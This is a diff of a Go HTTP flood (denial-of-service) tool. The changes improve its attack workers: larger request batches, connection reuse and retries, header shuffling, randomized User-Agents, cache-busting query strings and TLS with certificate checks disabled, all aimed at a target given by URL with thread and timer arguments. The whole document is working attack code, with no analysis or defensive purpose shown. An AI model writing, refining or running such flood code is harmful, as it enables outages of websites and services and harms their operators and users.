@@ -24,12 +24,21 @@ var (
     host    string
 )
 
+// Constants for optimization
+const (
+    maxRetries = 5
+    retryDelay = 50 * time.Millisecond
+    batchSize  = 20 // Adjust based on performance
+)
+
+// Supported HTTP methods
 var httpMethods = []string{"GET", "HEAD", "POST"}
 
 func init() {
     rand.Seed(time.Now().UnixNano())
 }
 
+// Resolve DNS to get target IPs
 func resolveDNS(hostname string) {
     addrs, err := net.LookupIP(hostname)
     if err != nil {
@@ -47,6 +56,7 @@ func resolveDNS(hostname string) {
     }
 }
 
+// Generate random User-Agent
 func randomUserAgent() string {
     browserVersions := map[string]string{
         "Chrome":  fmt.Sprintf("%d.0.%d.%d", rand.Intn(43)+80, rand.Intn(9999), rand.Intn(999)),
@@ -70,7 +80,7 @@ func randomUserAgent() string {
     }{
         {"Mobile", []string{"Pixel 6", "Galaxy S22", "Xiaomi 12", "iPhone15,2"}},
         {"Tablet", []string{"iPad13,4", "SM-T870", "Pixel Tablet"}},
-        {"Desktop", []string{"", "", "", ""}}, // Empty for desktop
+        {"Desktop", []string{"", "", "", ""}},
     }
 
     deviceType := devices[rand.Intn(len(devices))]
@@ -104,6 +114,7 @@ func randomUserAgent() string {
     )
 }
 
+// Build HTTP request with randomization
 func buildRequest(method, reqPath string) []byte {
     headers := []string{
         fmt.Sprintf("Host: %s", host),
@@ -116,82 +127,25 @@ func buildRequest(method, reqPath string) []byte {
         "Cache-Control: no-cache",
     }
 
-    if method == "POST" {
-        data := fmt.Sprintf("data=%d", rand.Intn(1000000))
-        headers = append(headers,
-            "Content-Type: application/x-www-form-urlencoded",
-            fmt.Sprintf("Content-Length: %d", len(data)),
-        )
-        rand.Shuffle(len(headers), func(i, j int) {
-            headers[i], headers[j] = headers[j], headers[i]
-        })
-        return []byte(fmt.Sprintf("%s %s HTTP/1.1\r\n%s\r\n\r\n%s",
-            method, reqPath, strings.Join(headers, "\r\n"), data))
-    }
-
     rand.Shuffle(len(headers), func(i, j int) {
         headers[i], headers[j] = headers[j], headers[i]
     })
+
+    headerStr := strings.Join(headers, "\r\n")
+
+    if method == "POST" {
+        data := fmt.Sprintf("data=%d", rand.Intn(1000000))
+        return []byte(fmt.Sprintf("%s %s HTTP/1.1\r\n%s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\n\r\n%s\r\n",
+            method, reqPath, headerStr, len(data), data))
+    }
+
     return []byte(fmt.Sprintf("%s %s HTTP/1.1\r\n%s\r\n\r\n",
-        method, reqPath, strings.Join(headers, "\r\n")))
+        method, reqPath, headerStr))
 }
 
-func floodWorker(id int, stop <-chan struct{}, wg *sync.WaitGroup) {
-    defer wg.Done()
-
-    tlsConfig := &tls.Config{
-        InsecureSkipVerify: true,
-        ServerName:         ip, // Correct SNI
-    }
-
-    const batchSize = 10
-
-    for {
-        select {
-        case <-stop:
-            return
-        default:
-            target := fmt.Sprintf("%s:%d", ips[rand.Intn(len(ips))], port)
-
-            conn, err := createConnection(target, tlsConfig)
-            if err != nil {
-                continue
-            }
-
-            for {
-                select {
-                case <-stop:
-                    conn.Close()
-                    return
-                default:
-                    var batch [][]byte
-                    for i := 0; i < batchSize; i++ {
-                        method := httpMethods[rand.Intn(len(httpMethods))]
-                        reqPath := path
-                        if rand.Intn(2) == 0 {
-                            reqPath += fmt.Sprintf("?rand=%d", rand.Intn(1000000))
-                        }
-                        batch = append(batch, buildRequest(method, reqPath))
-                    }
-
-                    var fullBatch bytes.Buffer
-                    for _, req := range batch {
-                        fullBatch.Write(req)
-                    }
-
-                    _, err := conn.Write(fullBatch.Bytes())
-                    if err != nil {
-                        conn.Close()
-                        break
-                    }
-                }
-            }
-        }
-    }
-}
-
+// Create TCP or TLS connection
 func createConnection(target string, tlsConfig *tls.Config) (net.Conn, error) {
-    conn, err := net.Dial("tcp", target)
+    conn, err := net.DialTimeout("tcp", target, 5*time.Second)
     if err != nil {
         return nil, err
     }
@@ -202,6 +156,68 @@ func createConnection(target string, tlsConfig *tls.Config) (net.Conn, error) {
     return conn, nil
 }
 
+// Worker function for sending requests
+func floodWorker(id int, stop <-chan struct{}, wg *sync.WaitGroup) {
+    defer wg.Done()
+
+    tlsConfig := &tls.Config{
+        InsecureSkipVerify: true,
+        ServerName:         host,
+    }
+
+    var currentTarget string
+    var currentConn net.Conn
+    var retryCount int
+
+    for {
+        select {
+        case <-stop:
+            if currentConn != nil {
+                currentConn.Close()
+            }
+            return
+        default:
+            if currentConn == nil {
+                currentTarget = fmt.Sprintf("%s:%d", ips[rand.Intn(len(ips))], port)
+                var err error
+                currentConn, err = createConnection(currentTarget, tlsConfig)
+                if err != nil {
+                    retryCount++
+                    if retryCount > maxRetries {
+                        time.Sleep(retryDelay * time.Duration(rand.Intn(3)+1))
+                        retryCount = 0
+                    }
+                    continue
+                }
+                retryCount = 0
+            }
+
+            var batch [][]byte
+            for i := 0; i < batchSize; i++ {
+                method := httpMethods[rand.Intn(len(httpMethods))]
+                reqPath := path
+                if rand.Intn(2) == 0 {
+                    reqPath += fmt.Sprintf("?rand=%d", rand.Intn(1e6))
+                }
+                batch = append(batch, buildRequest(method, reqPath))
+            }
+
+            fullBatch := bytes.NewBuffer(nil)
+            for _, req := range batch {
+                fullBatch.Write(req)
+            }
+
+            _, err := currentConn.Write(fullBatch.Bytes())
+            if err != nil {
+                currentConn.Close()
+                currentConn = nil
+                continue
+            }
+        }
+    }
+}
+
+// Main function
 func main() {
     if len(os.Args) < 4 {
         fmt.Println("Usage: <URL> <THREADS> <TIMER> [CUSTOM_HOST]")
